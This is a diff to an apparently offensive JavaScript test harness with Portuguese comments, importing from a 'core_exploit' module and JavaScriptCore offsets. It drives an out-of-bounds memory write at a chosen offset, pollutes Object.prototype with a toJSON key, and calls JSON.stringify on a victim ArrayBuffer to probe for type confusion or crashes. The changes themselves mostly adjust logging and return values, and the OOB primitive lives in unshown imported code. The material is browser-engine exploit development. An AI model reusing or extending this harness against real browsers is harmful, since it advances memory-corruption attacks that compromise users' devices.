@@ -7,7 +7,7 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-// Contador global para ser usado pelas variantes de toJSON definidas em runAllAdvancedTestsS3.mjs
+// Contador global, embora a toJSON principal deste teste não deva usá-lo.
 export let current_toJSON_call_count_for_TypeError_test = 0;
 
 export async function executeFocusedTestForTypeError(
@@ -17,7 +17,7 @@ export async function executeFocusedTestForTypeError(
     corruptionOffsetToTest // O offset específico para esta escrita OOB
 ) {
     const FNAME = `executeFocusedTestForTypeError<${testDescription}>`;
-    logS3(`--- Iniciando Teste Focado para TypeError: ${testDescription} ---`, "test", FNAME);
+    logS3(`--- Iniciando Teste Focado: ${testDescription} ---`, "test", FNAME);
     logS3(`    Corrupção OOB: Valor=${toHex(valueToWriteOOB)} @ Offset=${toHex(corruptionOffsetToTest)}`, "info", FNAME);
     document.title = `Iniciando: ${testDescription}`;
 
@@ -31,7 +31,7 @@ export async function executeFocusedTestForTypeError(
     if (!oob_array_buffer_real) {
         logS3("Falha OOB Setup.", "error", FNAME);
         document.title = "ERRO OOB Setup - " + FNAME;
-        return { errorOccurred: new Error("OOB Setup Failed"), calls: current_toJSON_call_count_for_TypeError_test, potentiallyCrashed: false };
+        return { errorOccurred: new Error("OOB Setup Failed"), calls: current_toJSON_call_count_for_TypeError_test, potentiallyCrashed: false, stringifyResult: null };
     }
     document.title = "OOB OK - " + FNAME;
 
@@ -41,7 +41,7 @@ export async function executeFocusedTestForTypeError(
     let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
     let pollutionApplied = false;
     let stepReached = "antes_pp";
-    let potentiallyCrashed = true; 
+    let potentiallyCrashed = true;
     let errorCaptured = null;
     let stringifyResult = null;
 
@@ -73,18 +73,19 @@ export async function executeFocusedTestForTypeError(
         logS3(`Chamando JSON.stringify(victim_ab) (com ${testDescription})...`, "info", FNAME);
         
         try {
-            stringifyResult = JSON.stringify(victim_ab); 
+            stringifyResult = JSON.stringify(victim_ab);
             stepReached = `apos_stringify`;
             potentiallyCrashed = false; 
             document.title = `Strfy OK (${testDescription})`;
-            logS3(`Resultado JSON.stringify: ${String(stringifyResult).substring(0, 100)}... (Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test})`, "info", FNAME);
+            // Log completo do stringifyResult para análise
+            logS3(`Resultado JSON.stringify: ${typeof stringifyResult === 'string' ? stringifyResult : JSON.stringify(stringifyResult)} (Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test})`, "info", FNAME);
         } catch (e) {
             stepReached = `erro_stringify`;
             potentiallyCrashed = false; 
             errorCaptured = e;
             document.title = `ERRO Strfy (${e.name}) - ${testDescription}`;
             logS3(`ERRO CAPTURADO JSON.stringify: ${e.name} - ${e.message}. (Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test})`, "critical", FNAME);
-            if (e.stack) logS3(`   Stack: ${e.stack}`, "error"); 
+            if (e.stack) logS3(`   Stack: ${e.stack}`, "error");
             console.error(`JSON.stringify ERROR (${testDescription}):`, e);
         }
     } catch (mainError) {
@@ -106,11 +107,11 @@ export async function executeFocusedTestForTypeError(
              logS3(`O TESTE PODE TER CONGELADO/CRASHADO em ${stepReached}. Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test}`, "error", FNAME);
         }
     }
-    logS3(`--- Teste Focado para TypeError Concluído: ${testDescription} (Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test}) ---`, "test", FNAME);
+    logS3(`--- Teste Focado Concluído: ${testDescription} (Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test}) ---`, "test", FNAME);
     if (!potentiallyCrashed && !errorCaptured) {
         document.title = `Teste Concluído OK - ${testDescription}`;
     } else if (errorCaptured && !document.title.startsWith("ERRO Strfy")) { 
         document.title = `ERRO OCORREU (${errorCaptured.name}) - ${testDescription}`;
     }
-    return { errorOccurred: errorCaptured, calls: current_toJSON_call_count_for_TypeError_test, potentiallyCrashed };
+    return { errorOccurred: errorCaptured, calls: current_toJSON_call_count_for_TypeError_test, potentiallyCrashed, stringifyResult };
 }
